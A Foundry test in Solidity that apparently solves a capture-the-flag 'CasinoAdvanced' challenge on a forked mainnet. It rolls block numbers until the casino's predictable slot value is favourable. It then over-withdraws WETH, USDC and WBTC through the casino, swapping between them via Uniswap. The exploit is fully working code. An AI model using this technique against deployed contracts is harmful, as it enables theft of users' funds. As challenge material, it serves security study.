// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {IUniswapV2Router02 as IRouter02} from "v2-periphery/interfaces/IUniswapV2Router02.sol";
import {Test} from "forge-std/Test.sol";
import {MainnetConfig as Config} from "./NetworkConfig.sol";
import {CasinoAdvancedBase, Casino} from "src/Casino/CasinoAdvanced.sol";

contract CasinoAdvancedTest is Test {
    CasinoAdvancedBase public base;
    Casino public casino;
    IRouter02 public router;
    address public you;
    address public owner;

    function setUp() external {
        vm.createSelectFork(Config.RPC_URL);
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        do {
            vm.rollFork(block.number - 1);
            base = new CasinoAdvancedBase(
                startTime, endTime, fullScore, Config.USDC, Config.WBTC, Config.WETH, Config.UNISWAPV2_ROUTER02
            );
            router = IRouter02(Config.UNISWAPV2_ROUTER02);
            you = makeAddr("you");
            deal(Config.USDC, you, 100e6);
            deal(Config.USDC, address(base), 1_000_000e6);
            deal(Config.WETH, address(base), 1_000e18);
            deal(Config.WBTC, address(base), 1e8);
            base.setup();
            casino = base.casino();
        } while (casino.slot() == 0);
    }

    function testExploit() public {
        vm.startPrank(you);
        uint256 height = block.number;
        while (casino.slot() != 3) {
            vm.roll(++height);
        }

        casino.play(Config.WETH, 1_000e18);
        casino.withdraw(Config.WETH, 1_000e18);

        IERC20(Config.WETH).approve(address(router), type(uint256).max);
        address[] memory p1 = new address[](2);
        p1[0] = Config.WETH;
        p1[1] = Config.USDC;
        router.swapExactTokensForTokens(IERC20(Config.WETH).balanceOf(you), 0, p1, you, block.timestamp);
        IERC20(Config.USDC).approve(address(casino), type(uint256).max);
        skip(1);
        casino.play(Config.USDC, 1_000_000e6 / 2);
        skip(1);
        casino.withdraw(Config.USDC, 1_000_000e6 / 2 + 1_000_000e6);

        IERC20(Config.USDC).approve(address(router), type(uint256).max);
        address[] memory p2 = new address[](2);
        p2[0] = Config.USDC;
        p2[1] = Config.WBTC;
        router.swapExactTokensForTokens(IERC20(Config.USDC).balanceOf(you), 0, p2, you, block.timestamp);
        IERC20(Config.WBTC).approve(address(casino), type(uint256).max);
        skip(1);
        casino.play(Config.WBTC, 1e8 / 2);
        skip(1);
        casino.withdraw(Config.WBTC, 1e8 / 2 + 1e8);

        base.solve();
        assertTrue(base.isSolved());
        vm.stopPrank();
    }
}
